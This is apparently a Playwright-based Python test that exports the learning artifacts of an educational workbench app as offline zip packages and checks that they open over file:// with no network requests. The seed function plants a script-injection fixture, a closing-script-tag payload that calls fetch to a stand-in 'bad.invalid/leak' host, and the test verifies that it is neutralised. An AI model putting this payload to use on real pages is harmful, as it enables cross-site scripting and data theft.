"""Actual export API/native button, owned backend shutdown, file:// offline reader."""

import argparse
import hashlib
import io
import json
import os
import re
import runpy
from pathlib import Path
from zipfile import ZipFile

from test_browser import Browser, ROOT, check, port_closed, write_json
from test_desktop_migration import create_course, wait_api
from test_mvp_a import api
from test_workbench_reading import digests
from test_workbench_workspace import WorkspaceInstance


def source_digests():
    result = digests()
    for directory in (
        ROOT / ".runtime/workbench/offline-reader",
        ROOT / "scripts/workbench",
    ):
        result.update(
            {
                path.relative_to(ROOT).as_posix(): hashlib.sha256(
                    path.read_bytes()
                ).hexdigest()
                for path in directory.rglob("*")
                if path.is_file() and "__pycache__" not in path.parts
            }
        )
    result[Path(__file__).relative_to(ROOT).as_posix()] = hashlib.sha256(
        Path(__file__).read_bytes()
    ).hexdigest()
    return result


def seed(instance, course, materials):
    from learning_app.course_files import CourseFileStore
    from learning_app.storage import Repository
    from learning_app.workbench.artifacts import ArtifactStore
    from learning_app.workbench.models import ArtifactCreate
    from learning_app.workbench.sources import SourceStore
    from learning_app.workbench.submitted_images import SubmittedImages
    from PIL import Image

    repo = Repository(instance.directory / "data")
    files, sources, store = (
        CourseFileStore(repo),
        SourceStore(repo),
        ArtifactStore(repo),
    )
    opened = files.open(course, "migration-read.txt")
    text = (materials / "migration-read.txt").read_text("utf-8")
    start, end = text.index("学习条件"), text.index("\nNEIGHBOR_AFTER")
    selected = sources.capture_text(
        course, opened["asset_id"], opened["source_version"], start, end
    )
    pdf = files.open(course, "image.pdf")
    image = sources.capture_document_image(
        course, pdf["asset_id"], pdf["source_version"], 1
    )
    cited = [selected.snapshot_id, image.snapshot_id]
    confirmed = []
    for kind, media in (("JPEG", "image/jpeg"), ("WEBP", "image/webp")):
        content = io.BytesIO()
        Image.new("RGB", (32, 24), "#1245ab").save(content, format=kind)
        confirmed.append(repo.stage_attachment(content.getvalue(), media_type=media))
    image_chat = repo.create_chat(course)["chat_id"]
    submitted = repo.publish_submission(
        image_chat,
        "仅保存这两张自造图片，用于离线验收，不请求模型。",
        "offline_image_fixture",
        attachment_ids=[item["attachment_id"] for item in confirmed],
    )
    # Fixture preparation uses the real immutable submission store, then stops
    # the pending request before any service/model dispatch is ever scheduled.
    repo.request_cancel(submitted["generation_id"])
    context = repo.get_generation(submitted["generation_id"])["context_snapshot"]
    with repo.engine.begin() as conn:
        submitted_sources = SubmittedImages.freeze(
            conn, repo, course, context["snapshot_id"], context["context_hash"], context
        )
    assert len(submitted_sources) == 2
    assert repo.counts()["outbound_attempts"] == 0
    base = {
        "block_id": "text",
        "kind": "markdown",
        "markdown": "学习条件：$y=a x^2$。\n\n仅依据已保存的选区与页图。",
        "attribution": "source_paraphrase",
        "source_snapshot_ids": cited,
    }
    question = {
        "block_id": "question",
        "kind": "question",
        "markdown": "a=2、x=1时，选择y。",
        "attribution": "user_authored",
        "source_snapshot_ids": [selected.snapshot_id],
        "question": {
            "question_type": "single_choice",
            "options": [
                {"option_id": "A", "text": "2"},
                {"option_id": "B", "text": "4"},
            ],
            "reference_answer": "A",
            "explanation": "先平方1，再乘2。",
            "answer_authority": "user_confirmed",
        },
    }
    card = {
        "block_id": "card",
        "kind": "card",
        "markdown": "先回忆二次函数的式子。",
        "attribution": "user_authored",
        "card": {"back": "$y=a x^2$，先平方，再乘系数。"},
        "source_snapshot_ids": [selected.snapshot_id],
    }
    plot = {
        "block_id": "plot",
        "kind": "visualization",
        "markdown": "改变系数，比较同一个式子。",
        "attribution": "user_authored",
        "visualization": {
            "render_type": "cartesian",
            "renderer": {"native_renderer": "cartesian"},
            "presentation": {"title": "离线参数与动画"},
            "payload": {
                "data": {
                    "kind": "cartesian",
                    "expression": "a*x^2",
                    "parameters": [
                        {
                            "symbol": "a",
                            "label": "系数a",
                            "min": -2,
                            "max": 2,
                            "step": 0.1,
                            "initial": 1,
                        }
                    ],
                    "x_range": {"min": -3, "max": 3},
                    "y_range": {"min": -20, "max": 20},
                    "probe_x": 1,
                    "animate_parameter": "a",
                }
            },
        },
    }
    artifacts = {}

    def create(kind, blocks):
        artifact = store.create(
            course,
            ArtifactCreate.model_validate(
                {
                    "operation_id": "offline_" + kind,
                    "kind": kind,
                    "title": "离线验证-" + kind,
                    "body": {"blocks": blocks},
                }
            ),
        ).artifact
        artifacts[kind] = artifact.model_dump(mode="json")
        return artifact

    paper = create("question_set", [question])
    create("card_set", [card])
    create("visualization", [plot])
    create(
        "learning_path",
        [
            {
                "block_id": "step",
                "kind": "path_step",
                "markdown": "自由选择学习顺序。",
                "attribution": "user_authored",
                "step": {
                    "title": "核对条件",
                    "objective": "保留给定系数",
                    "recall_prompt": "不看解析先回忆。",
                    "explanation": "可跳过，不自动记掌握。",
                    "questions": [
                        {
                            "artifact_id": paper.artifact_id,
                            "revision_id": paper.head_revision_id,
                            "block_id": "question",
                        }
                    ],
                },
            }
        ],
    )
    create(
        "essay",
        [
            {
                "block_id": "draft",
                "kind": "essay_draft",
                "markdown": "I have a useful book.",
                "attribution": "user_authored",
                "essay": {"topic": "A useful book"},
            },
            {
                "block_id": "feedback",
                "kind": "essay_feedback",
                "markdown": "参考批注：检查主谓一致。",
                "attribution": "user_authored",
                "feedback": {
                    "round_id": "fixture_round",
                    "draft_revision_id": "fixture_draft",
                    "draft_content_hash": "a" * 64,
                    "annotated_text": "I have a useful book.",
                },
            },
        ],
    )
    for kind in ("note", "translation", "handout", "solution", "report"):
        blocks = [base]
        if kind == "handout":
            blocks = [base, question, card, plot]
        if kind == "note":
            blocks = [
                {
                    **base,
                    "source_snapshot_ids": [
                        *cited,
                        *[item.snapshot_id for item in submitted_sources],
                    ],
                },
                {
                    "block_id": "attack",
                    "kind": "markdown",
                    "attribution": "user_authored",
                    "markdown": '</script><script>window.OFFLINE_ATTACK=1;fetch("https://bad.invalid/leak")</script>\n![remote](https://bad.invalid/image.png)',
                },
            ]
        create(kind, blocks)
    repo.close()
    return artifacts, selected.snapshot_id, image.snapshot_id


def unpack(path, directory):
    with ZipFile(path) as archive:
        assert all(
            not Path(name).is_absolute() and ".." not in Path(name).parts
            for name in archive.namelist()
        )
        archive.extractall(directory)
    manifest = json.loads((directory / "manifest.json").read_text("utf-8"))
    for item in manifest["files"]:
        assert (
            hashlib.sha256((directory / item["path"]).read_bytes()).hexdigest()
            == item["sha256"]
        )
    page = (directory / "index.html").read_text("utf-8")
    match = re.search(
        r'<script type="application/json" id="learning-offline-data">(.*?)</script>',
        page,
        re.S,
    )
    return json.loads(match.group(1))


def run_case(directory, executable, port):
    materials = directory / "synthetic-course"
    materials.mkdir()
    (materials / "migration-read.txt").write_text(
        "NEIGHBOR_BEFORE\n学习条件：函数y=a*x^2，a=1和x=1时y=1。\nNEIGHBOR_AFTER",
        "utf-8",
    )
    generate = runpy.run_path(str(ROOT / "tests/fixtures/workbench/generate.py"))[
        "reading_pdf"
    ]
    generate(materials / "image.pdf")
    original_hashes = {
        p.name: hashlib.sha256(p.read_bytes()).hexdigest() for p in materials.iterdir()
    }
    instance = WorkspaceInstance(directory / "server", port)
    browser = Browser(directory / "browser", executable)
    result = {
        "status": "running",
        "layer": "native export button + actual owned backend + file:// Chromium offline",
        "actual_provider_calls": 0,
        "user_learning_experience": "not_run",
        "assertions": [],
        "source_before": source_digests(),
    }
    stopped = False
    try:
        instance.start()
        browser.command(
            "open", instance.url + "/desktop/", f"--config={browser.config}"
        )
        course, mapping = create_course(
            browser, instance, {"course_root": str(materials)}, result
        )
        artifacts, selection, image = seed(instance, course, materials)
        response = api(
            browser,
            f"/desktop/sessions/{mapping['session_id']}/learning-task-intents",
            {
                "operation_id": "offline_book",
                "kind": "book",
                "instruction": "整理所选条件，形成两章，连续完成。",
                "coverage_mode": "complete",
                "outline_supplied": True,
                "sources": [{"kind": "selection", "snapshot_id": selection}],
                "target": {"mode": "create", "title": "离线验证-book"},
                "outline": [
                    {
                        "chapter_id": "chapter_1",
                        "title": "条件与来源",
                        "objective": "核对条件",
                    },
                    {
                        "chapter_id": "chapter_2",
                        "title": "串联与回忆",
                        "objective": "自由回顾",
                    },
                ],
            },
            method="POST",
        )
        assert response["status"] == 200, response
        task = wait_api(
            browser,
            f"/courses/{course}/learning/tasks/{response['body']['task_id']}",
            "value.state==='completed'",
            timeout_ms=40000,
        )
        target = api(
            browser, f"/courses/{course}/learning/tasks/{task['task_id']}/coverage"
        )["body"]["target"]["artifact_id"]
        book = api(browser, f"/courses/{course}/learning/artifacts/{target}")["body"]
        block = dict(book["revision"]["body"]["blocks"][0])
        block["source_snapshot_ids"] = list(
            dict.fromkeys(block["source_snapshot_ids"] + [image])
        )
        changed = api(
            browser,
            f"/courses/{course}/learning/artifacts/{target}/update",
            {
                "operation_id": "attach_confirmed_page",
                "expected_revision_id": book["head_revision_id"],
                "changes": [{"block_id": block["block_id"], "replacement": block}],
            },
            method="POST",
        )
        assert changed["status"] == 200, changed
        artifacts["book"] = changed["body"]["artifact"]
        downloads = directory / "downloads"
        downloads.mkdir()
        browser.command(
            "run-code",
            "async(page)=>{await page.getByRole('tab',{name:'学习成果与任务',exact:true}).click();await page.getByRole('navigation',{name:'学习成果列表',exact:true}).getByRole('button').filter({hasText:'离线验证-book'}).click();await page.getByRole('heading',{name:'离线验证-book',exact:true}).waitFor();}",
        )
        book_path = downloads / "book.zip"
        browser.command(
            "run-code",
            "async(page)=>{const downloading=page.waitForEvent('download');await page.getByRole('button',{name:'导出离线包',exact:true}).click();const download=await downloading;await download.saveAs("
            + json.dumps(str(book_path))
            + ");}",
        )
        check(
            book_path.is_file(),
            "native_export_button_downloads_the_selected_revision",
            result,
        )
        for kind, artifact in artifacts.items():
            if kind == "book":
                continue
            destination = downloads / f"{kind}.zip"
            path = f"/api/v1/courses/{course}/learning/artifacts/{artifact['artifact_id']}/offline-export"
            browser.command(
                "run-code",
                "async(page)=>{const downloading=page.waitForEvent('download');await page.evaluate(async({path,revision})=>{const session=await(await fetch('/api/v1/session')).json();const response=await fetch(path,{method:'POST',headers:{'Content-Type':'application/json','X-Learning-CSRF':session.csrf_token},body:JSON.stringify({revision_id:revision})});if(!response.ok)throw Error('EXPORT_HTTP_'+response.status);const blob=await response.blob();const url=URL.createObjectURL(blob);const anchor=document.createElement('a');anchor.href=url;anchor.download='export.zip';anchor.click();setTimeout(()=>URL.revokeObjectURL(url),1000);},"
                + json.dumps({"path": path, "revision": artifact["head_revision_id"]})
                + ");const download=await downloading;await download.saveAs("
                + json.dumps(str(destination))
                + ");}",
            )
        check(
            len(list(downloads.glob("*.zip"))) == 11,
            "all_eleven_artifact_kinds_export_with_the_formal_api",
            result,
        )
        result["cleanup"] = instance.stop()
        stopped = True
        check(
            port_closed(port), "owned_backend_is_stopped_before_offline_reading", result
        )
        db = instance.directory / "data/business.sqlite3"
        before_db = hashlib.sha256(db.read_bytes()).hexdigest()
        browser.command(
            "run-code",
            "async(page)=>{const context=page.context();await context.setOffline(true);await page.goto('about:blank');await context.route('**/*',async(route)=>{if(/^https?:/.test(route.request().url()))await route.abort();else await route.continue();});}",
        )
        browser.command("requests", "--static", "--clear")
        browser.command(
            "run-code",
            "async(page)=>{await page.goto('https://offline-monitor.invalid/calibration').catch(()=>null);}",
        )
        calibration = browser.command("requests", "--static", "--filter=^https?://")
        check(
            "https://offline-monitor.invalid/calibration" in calibration,
            "network_monitor_detects_a_deliberately_blocked_calibration_request",
            result,
        )
        result["network_monitor_calibration"] = calibration
        browser.command("requests", "--clear")
        result["network_observation"] = {}
        documents = {}
        for kind in artifacts:
            destination = directory / "unpacked" / kind
            documents[kind] = unpack(downloads / f"{kind}.zip", destination)
            url = (destination / "index.html").resolve().as_uri()
            browser.command(
                "run-code",
                "async(page)=>{await page.goto("
                + json.dumps(url)
                + ");await page.getByRole('heading',{name:"
                + json.dumps(artifacts[kind]["title"])
                + ",exact:true}).waitFor();}",
            )
            check(documents[kind]["kind"] == kind, "offline_file_opens_" + kind, result)
            if kind == "note":
                browser.command(
                    "run-code",
                    "async(page)=>{for(const number of [1,2,3,4])await page.getByText('来源 '+number,{exact:false}).first().click();await page.waitForFunction(()=>[...document.querySelectorAll('img')].filter(img=>img.complete&&img.naturalWidth>0).length===3);await page.evaluate(()=>document.fonts.ready);}",
                )
                value = browser.evaluate(
                    "()=>({attack:window.OFFLINE_ATTACK??null,math:document.querySelectorAll('.katex').length,fonts:[...document.fonts].filter(font=>font.family.includes('KaTeX')&&font.status==='loaded').length,images:[...document.images].filter(img=>img.complete&&img.naturalWidth>0).length,text:document.body.innerText})"
                )
                check(
                    value["attack"] is None
                    and value["math"] > 0
                    and value["fonts"] > 0
                    and value["images"] == 3
                    and "NEIGHBOR_BEFORE" not in value["text"]
                    and "NEIGHBOR_AFTER" not in value["text"],
                    "offline_math_fonts_exact_source_and_authorized_image_work_without_scripts_or_neighbours",
                    result,
                )
                check(
                    {
                        Path(source["image"]).suffix
                        for source in documents[kind]["sources"]
                        if source.get("image")
                    }
                    == {".png", ".jpeg", ".webp"},
                    "offline_v3_preserves_actual_png_jpeg_and_webp_source_images",
                    result,
                )
            elif kind == "visualization":
                browser.command(
                    "run-code",
                    "async(page)=>{const figure=page.getByRole('figure',{name:'离线参数与动画',exact:true});await figure.locator('svg[data-worker-frame]').waitFor();await figure.getByRole('slider',{name:'系数a',exact:true}).fill('2');await figure.getByText('f(1) = 2；此处斜率 = 4',{exact:true}).waitFor();const start=Number(await figure.locator('svg[data-worker-frame]').getAttribute('data-worker-frame'));await figure.getByRole('button',{name:'播放动画',exact:true}).click();await page.waitForFunction(n=>Number(document.querySelector('svg[data-worker-frame]').dataset.workerFrame)>n+3,start);await figure.getByRole('button',{name:'暂停动画',exact:true}).click();}",
                )
                check(
                    True,
                    "offline_parameter_math_and_user_started_animation_use_real_workers",
                    result,
                )
            elif kind == "question_set":
                browser.command(
                    "run-code",
                    "async(page)=>{const question=page.getByRole('region',{name:'离线自测',exact:true});await page.getByRole('radio',{name:'A. 2',exact:true}).check();await page.getByRole('button',{name:'对照参考答案',exact:true}).click();await page.getByText('与参考选项一致。',{exact:true}).waitFor();await page.reload();await page.getByRole('button',{name:'对照参考答案',exact:true}).waitFor();if(await page.getByRole('radio',{name:'A. 2',exact:true}).isChecked())throw Error('OFFLINE_ANSWER_WAS_PERSISTED');}",
                )
                check(
                    True,
                    "offline_self_test_compares_locally_and_refresh_clears_answers",
                    result,
                )
            elif kind == "card_set":
                browser.command(
                    "run-code",
                    "async(page)=>{await page.getByRole('button',{name:'翻面核对',exact:true}).click();await page.getByRole('button',{name:'已回忆',exact:true}).click();await page.getByText('本次标为已回忆，不改变正式复习安排。',{exact:true}).waitFor();}",
                )
                check(
                    True,
                    "offline_card_flip_and_recall_have_no_scheduling_bridge",
                    result,
                )
            elif kind == "learning_path":
                browser.command(
                    "run-code",
                    "async(page)=>{await page.getByRole('button',{name:'本次跳过',exact:true}).click();await page.getByText('已在本页跳过，可随时返回；不记掌握。',{exact:true}).waitFor();await page.getByRole('radio',{name:'A. 2',exact:true}).check();await page.getByRole('button',{name:'对照参考答案',exact:true}).click();await page.getByText('与参考选项一致。',{exact:true}).waitFor();}",
                )
                check(
                    True,
                    "offline_suggested_path_allows_skip_and_pinned_linked_question",
                    result,
                )
            elif kind == "book":
                browser.command(
                    "run-code",
                    "async(page)=>{await page.getByRole('navigation',{name:'交互书目录',exact:true}).waitFor();await page.getByRole('button',{name:'下一页',exact:true}).click();await page.getByRole('button',{name:'上一页',exact:true}).click();await page.getByRole('textbox',{name:'本次离线作答',exact:true}).fill('先核对已保存来源。');await page.getByRole('button',{name:'对照参考答案',exact:true}).click();await page.getByText('请自行对照理由与条件，本页不作正式判分。',{exact:true}).waitFor();}",
                )
                check(
                    len(documents[kind]["chapters"]) == 2,
                    "offline_book_keeps_pinned_directory_navigation_and_local_self_test",
                    result,
                )
            observation = browser.command("requests", "--static", "--filter=^https?://")
            result["network_observation"][kind] = observation
            assert not re.search(r"https?://", observation), observation
            browser.command("requests", "--clear")
        browser.command(
            "screenshot",
            f"--filename={browser.directory / 'offline-book.png'}",
            "--full-page",
        )
        check(
            len(result["network_observation"]) == 11,
            "offline_packages_make_no_http_requests_including_the_stopped_backend",
            result,
        )
        check(
            hashlib.sha256(db.read_bytes()).hexdigest() == before_db,
            "offline_interactions_do_not_change_the_stopped_application_database",
            result,
        )
        check(
            all(
                hashlib.sha256((materials / name).read_bytes()).hexdigest() == digest
                for name, digest in original_hashes.items()
            ),
            "original_materials_remain_unchanged",
            result,
        )
        result["status"] = "passed"
    except BaseException as error:
        result.update(status="failed", failure=f"{type(error).__name__}: {error}")
        try:
            browser.snapshot("failure")
            browser.command(
                "screenshot",
                f"--filename={browser.directory / 'failure.png'}",
                "--full-page",
            )
        except Exception:
            pass
    finally:
        result["browser_cleanup"] = browser.close()
        if not stopped:
            result["cleanup"] = instance.stop()
        result["source_after"] = source_digests()
        result["source_changed_during_run"] = (
            result["source_before"] != result["source_after"]
        )
        if result["source_changed_during_run"]:
            result["status"] = "failed"
        write_json(directory / "result.json", result)
    return result


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--run-id", required=True)
    parser.add_argument("--backend-port", type=int, default=19259)
    parser.add_argument(
        "--browser-path",
        type=Path,
        default=Path(os.environ.get("LOCALAPPDATA", ""))
        / "ms-playwright/chromium-1234/chrome-win64/chrome.exe",
    )
    args = parser.parse_args()
    if not re.fullmatch(r"[A-Za-z0-9_-]+", args.run_id) or not port_closed(
        args.backend_port
    ):
        raise RuntimeError("RUN_ID_INVALID_OR_PORT_IN_USE")
    output = ROOT / "output/playwright" / args.run_id
    output.mkdir(parents=True, exist_ok=False)
    result = run_case(output, args.browser_path, args.backend_port)
    print(
        json.dumps(
            {
                "status": result["status"],
                "assertions": len(result["assertions"]),
                "evidence": str(output / "result.json"),
            },
            ensure_ascii=False,
        )
    )
    raise SystemExit(0 if result["status"] == "passed" else 1)
